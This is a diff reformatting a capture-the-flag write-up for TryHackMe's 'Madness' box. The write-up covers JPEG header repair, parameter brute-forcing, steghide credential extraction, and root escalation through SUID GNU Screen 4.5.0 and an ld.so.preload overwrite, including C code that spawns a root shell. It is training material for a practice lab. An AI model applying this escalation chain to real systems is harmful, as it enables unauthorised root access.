@@ -1,20 +1,24 @@
 # 'Madness' box writeup
-## Madness is a CTF box created by optional and available on the [TryHackMe platform](https://tryhackme.com).
+
+## Madness is a CTF box created by optional and available on the [TryHackMe platform](https://tryhackme.com)
+
 ## Read about [JPG Signature Format: Documentation & Recovery Example](https://www.file-recovery.com/jpg-signature-format.htm), [GNU Screen escalation](https://seclists.org/oss-sec/2017/q1/184), [ld.so man page](https://man7.org/linux/man-pages/man8/ld.so.8.html) and [ld.so.preload](https://superuser.com/questions/1183037/what-is-does-ld-so-preload-do)
-# ![bg](images/banner.png?raw=true "Title")
+
+![bg](images/banner.png)
 
 ## Foothold
+
 + **We deploy the machine and start with a nmap scan for open ports**
 
 ``nmap -sV -sC -oN scan1 10.10.94.80``
 
 + **We observe 2 open ports, ssh and an http, the last one with an Apache service**
 
-# ![1](images/nmap_mad.jpg?raw=true "mad")
+![1](images/nmap_mad.jpg)
 
 + **Opening the web-site, we can view an Apache2 Default Page, but looking into the source-code of the page, we observe something interesting**
 
-# ![2](images/page.jpg?raw=true "page")
+![2](images/page.jpg)
 
 **There's a comment through the lines** ``They will never find me`` **and an image above, so it's obvious that the image it's a path to go on. Let's get that image into our machine**
 
@@ -26,13 +30,13 @@
 
 **Let's look into the content of our image. It looks like our output says that our image is in PNG format. Maybe someone changed the image format.**
 
-# ![3](images/head.jpg?raw=true "head")
+![3](images/head.jpg)
 
 + **Furthermore, reading the [JPEG Signature](https://www.file-recovery.com/jpg-signature-format.htm) article, we can spot this: *JPEG files (compressed images) start with an image marker that always contains the tag code hex values FF D8 FF.* Let's take a look into our image header in hex format, using hexdump**
 
 ``hexdump thm.jpg | head -1``
 
-# ![4](images/hexo.jpg?raw=true "hex")
+![4](images/hexo.jpg)
 
 **We can clearly see the first bytes are modified, but we can change them using the hexedit tool. Let's modify the first 2 hex sequences values with:**
 
@@ -40,27 +44,27 @@
 
 ``hexedit thm.jpg``
 
-# ![5](images/hexedit.jpg?raw=true "hexed")
+![5](images/hexedit.jpg)
 
-**Opening our image now, we can see a font which tells us a hidden dir exists on our web server**
+**Opening our image now, we can see a font which tells us a hidden dir exists on our web server.**
 
 ``xdg-open thm.jpg``
 
-# ![6](images/hiddendir.jpg?raw=true "hidden")
+![6](images/hiddendir.jpg)
 
 + **Let's take a look into that directory and see what's going on**
 
-# ![7](images/webhid.jpg?raw=true "webbed")
+![7](images/webhid.jpg)
 
-**It seems like our mad friend wants to guess his secret .. But since i'm not a good guesser, let's take a look into the source code of the page**
+**It seems like our mad friend wants to guess his secret .. But since i'm not a good guesser, let's take a look into the source code of the page.**
 
-# ![8](images/guess_1.jpg?raw=true "secret")
+![8](images/guess_1.jpg)
 
-**He left some unwanted text inside. We know now, that the secret is between 0 and 99, but in the same time, looking into the page we see that there was already a secret entered. Maybe it's a parameter of the page we could enter; let's go on:  + !! don't forget to modify the url and include the hidden found directory**
+**He left some unwanted text inside. We know now, that the secret is between 0 and 99, but in the same time, looking into the page we see that there was already a secret entered. Maybe it's a parameter of the page we could enter; let's go on:  + !! don't forget to modify the url and include the hidden found directory.**
 
 ``http://10.10.94.80/x/?secret=2``
 
-# ![9](images/secreted_1.jpg?raw=true "secret")
+![9](images/secreted_1.jpg)
 
 **Our secret seems to be entered and read inside the page, so let's go ahead and create a mini brute-force script to check 100 possible variants.**
 
@@ -87,13 +91,13 @@ done
 
 ```
 
-**Let's make it executable too and let's run it**
+**Let's make it executable too and let's run it!**
 
 ``chmod a+x secret_guess.sh``
 
 ``./secret_guess.sh``
 
-# ![10](images/secrfound.jpg?raw=true "secretf")
+![10](images/secrfound.jpg)
 
 ## User escalation
 
@@ -101,7 +105,7 @@ done
 
 ``steghide --extract -sf thm.jpg``
 
-# ![11](images/foundit.jpg?raw=true "found")
+![11](images/foundit.jpg)
 
 **The image contained a file named** hidden.txt **and, reading it we'll find the username. But, it seems to be encoded with a rot13 cipher, so let's decode it**
 
@@ -109,21 +113,21 @@ done
 
 + **We have the username, but we have no password so we can connect to the ssh. Continuing the enumeration and considering the predomination of images in this box, we have one image that we probably skipped: the one inside the tryhackme platform.**
 
-# ![12](images/platform.jpg?raw=true "platform")
+![12](images/platform.jpg)
 
-**Let's extract this image too and see what's inside**
+**Let's extract this image too and see what's inside.**
 
 ``steghide --extract -sf 5iW7kC8.jpg``
 
-# ![13](images/passwordf.jpg?raw=true "pass")
+![13](images/passwordf.jpg)
 
 + **We got out password now, so let's connect to ssh**
 
 ``ssh youfoundme@10.10.94.80``
 
-# ![14](images/user_flago_re.jpg?raw=true "user_flag")
+![14](images/user_flago_re.jpg)
 
-**We found our first user flag inside our home directory. Let's move on to the root flag**
+**We found our first user flag inside our home directory. Let's move on to the root flag.**
 
 ## Root escalation
 
@@ -131,7 +135,7 @@ done
 
 ``find / -perm /4000 2>/dev/null``
 
-# ![15](images/perm.jpg?raw=true "perm")
+![15](images/perm.jpg)
 
 **We can see the** */bin/screen-4.5.0* **and** */bin/screen-4.5.0.old* **both having SUID permission. Reading the [GNU Screen escalation](https://seclists.org/oss-sec/2017/q1/184) request, we can follow up instructions and see that we can open the logfile with root privileges, this meaning we can create a file, owned by root, which can contain anything. Let's check it out**
 
@@ -141,7 +145,7 @@ done
 
 ``ls -l test``
 
-# ![16](images/test_1.jpg?raw=true "test")
+![16](images/test_1.jpg)
 
 + **And the file owner is root. Let's exploit this vulnerability. First, let's create a C program so we can generate a root shell and compile it. We're gonna create it in the /tmp directory**
 
@@ -153,14 +157,14 @@ done
 
 int main(void)
 {
-	// set user as root;
-	setuid(0);
-	setgid(0);
-	seteuid(0);
-	setegid(0);
+ // set user as root;
+ setuid(0);
+ setgid(0);
+ seteuid(0);
+ setegid(0);
 
-	// spawn a shell;
-	system("/bin/bash");
+ // spawn a shell;
+ system("/bin/bash");
 }
 ```
 
@@ -199,6 +203,6 @@ void libshell(void)
 
 **And we are root!**
 
-# ![17](images/root_flag_4.jpg?raw=true "root_flag")
+![17](images/root_flag_4.jpg)
 
 + **This was a very nice box, we learnt about .JPG corrupted files, a GNU Screen vulnerability, some ld.so.preload file overwriting to gain the desired shell and I encourage you hardly to read the [ld.so man page](https://man7.org/linux/man-pages/man8/ld.so.8.html).**
